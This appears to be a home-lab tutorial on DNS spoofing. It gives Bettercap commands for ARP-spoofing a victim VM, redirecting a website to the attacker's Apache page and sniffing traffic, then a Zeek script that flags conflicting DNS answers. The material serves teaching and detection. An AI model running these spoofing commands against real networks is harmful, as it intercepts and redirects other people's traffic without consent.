## Simulate DNS Spoofing from Attacker VM

Start Bettercap first 

```bash
sudo bettercap -iface eth0
```

Scan the Network
Enable network probing and view discovered devices:

```bash
net.probe on
net.show
```
 Find your victim's IP.

 ![image](https://github.com/user-attachments/assets/5b52ba33-122a-48bd-9870-dc5ba6f11d24)

victim ip 10.0.2.6

Start the Apache server using

```bash
sudo systmctl start apache2
```

Launch ARP Spoof Attack
 Target the victim:

```bash
set arp.spoof.targets 10.0.2.6
```
Start ARP spoofing:

```bash
arp.spoof on
```
Now Start DNS Spoofing 

```bash
set dns.spoof.domains httpforever.com
```
```bash
set arp.spoof.targets 10.0.2.6
```
```bash
set arp.spoof.address 10.0.2.5
```
```bash
dns.spoof on
```
 Sniff Victim’s Traffic
Enable network sniffing:

```
net.sniff on
```

Bettercap is displaying the Spoofing happening

![image](https://github.com/user-attachments/assets/1a06c906-be27-4439-aba6-ab03e0e99167)

On the victim's browser also the site was redirected to the apache page of the attacker's ip

![image](https://github.com/user-attachments/assets/d07e228a-faba-40b3-8ad8-98be14c720fb)

## Detect ARP Spoofing using Zeek

Add the DNS script to zeek

Create a dns-spoof.zeek file inside the zeek site directory

```bash
nano /opt/zeek/share/zeek/site/dns-spoof.zeek
```
Now paste the script inside it

```bash
@load base/protocols/dns

module DNS_Spoof_Detect;

export {
    redef enum Notice::Type += {
        DNS_Spoofing_Detected
    };
    
    # Time window to detect conflicting responses (as interval)
    const conflict_window = 2.0sec &redef;
    
    # Enable debug logging
    const debug_mode = T &redef;
}

# Track recent DNS responses
global recent_dns_responses: table[string] of set[addr] &read_expire=10sec;
global last_query_time: table[string] of time &write_expire=5sec;

function log_debug(msg: string)
{
    if (debug_mode) {
        print fmt("%s: %s", current_time(), msg);
    }
}

event dns_request(c: connection, msg: dns_msg, query: string, qtype: count, qclass: count)
{
    if (qtype == 1) {  # Only A records
        local host = to_lower(query);
        last_query_time[host] = network_time();
        log_debug(fmt("DNS query: %s from %s", host, c$id$orig_h));
    }
}

event dns_A_reply(c: connection, msg: dns_msg, ans: dns_answer, a: addr)
{
    local host = to_lower(ans$query);
    
    # Only process if we've seen a recent query for this host
    if (host !in last_query_time) {
        log_debug(fmt("Ignoring response for %s (no recent query)", host));
        return;
    }
    
    # Initialize response tracking
    if (host !in recent_dns_responses) {
        recent_dns_responses[host] = set();
        log_debug(fmt("First response for %s: %s", host, a));
    }
    
    # Check for IP conflicts within the detection window
    if (a !in recent_dns_responses[host]) {
        local time_since_query = network_time() - last_query_time[host];
        
        if (|recent_dns_responses[host]| > 0 && time_since_query < conflict_window) {
            log_debug(fmt("DNS CONFLICT: %s -> %s (previous: %s) from %s", 
                         host, a, recent_dns_responses[host], c$id$resp_h));
            
            NOTICE([$note=DNS_Spoofing_Detected,
                    $conn=c,
                    $msg=fmt("DNS spoofing detected for %s", host),
                    $sub=fmt("New IP: %s, Previous IPs: %s, Time since query: %.2f sec", 
                            a, recent_dns_responses[host], time_since_query)]);
        }
        else if (|recent_dns_responses[host]| > 0) {
            log_debug(fmt("New IP for %s after window: %s (time: %.2f sec)", 
                         host, a, time_since_query));
        }
        
        # Add this IP to known responses
        add recent_dns_responses[host][a];
    }
    else {
        log_debug(fmt("Known IP for %s: %s", host, a));
    }
}
```
Open your local Zeek configuration file 

```bash
nano /opt/zeek/share/zeek/site/local.zeek
```
Add this line to load the DNS script:

```zeek
@load ./dns-spoof
```
![image](https://github.com/user-attachments/assets/5db476d0-baef-4449-9cd4-d2eb3a9905da)

Save and close it

 Deploy/Restart Zeek to apply your updated configuration:

```bash
cd /opt/zeek/bin
sudo ./zeekctl deploy
```
This restarts Zeek and loads the new DNS detection logic Scrpit .

now after some time we will able to see notice.log file in current .
enter as root user  `sudo su`

```
cd /opt/zeek/logs/current
```

Tail the file to monitor live, then perform the attack.We can see that dns spoofing as dectected.

```
tail -f notice.log
```

![Screenshot 2025-06-30 165237](https://github.com/user-attachments/assets/d651f948-86ba-43dd-87d1-b6c0287cfbb9)

